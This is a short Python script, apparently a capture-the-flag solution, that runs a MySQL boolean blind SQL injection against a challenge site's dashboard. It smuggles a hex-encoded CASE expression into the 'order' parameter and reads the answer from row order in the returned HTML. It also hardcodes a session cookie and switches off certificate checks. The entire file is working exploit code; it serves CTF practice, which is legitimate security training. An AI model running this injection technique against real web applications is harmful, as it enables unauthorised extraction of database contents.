import asyncio as ai
import httpx
from typing import *
from base64 import b64encode
import regex as re
from injecter import mysql_blind_inject
from retry import retry

async def main():
  client = httpx.AsyncClient(timeout=5, 
                             #proxies={"https://": "http://127.0.0.1:8082"},
                             verify=False,
                             cookies={"JSESSIONID": "5AD1951844B9660D40915E03D998EF3D"})

  @retry(tries=3)
  async def sender_func(payload:str)->bool:
    payload = f"case when () like 0x{bytes(payload+'%','utf-8').hex()} then id else ~id end"
    #print(payload)
    res=await client.get(
        "https://b149b0874583ddc42ae4b2d39f72109a.2022.capturetheflag.fun/dashboard",
        params={"order":payload})
    html=res.content.decode().replace('\n','')
    return re.findall("<td>3</td>.*<td>4</td>",html).__len__()>0

  print(await mysql_blind_inject(sender_func,need_print=True))

  await client.aclose()

if __name__=='__main__':
  ai.run(main())
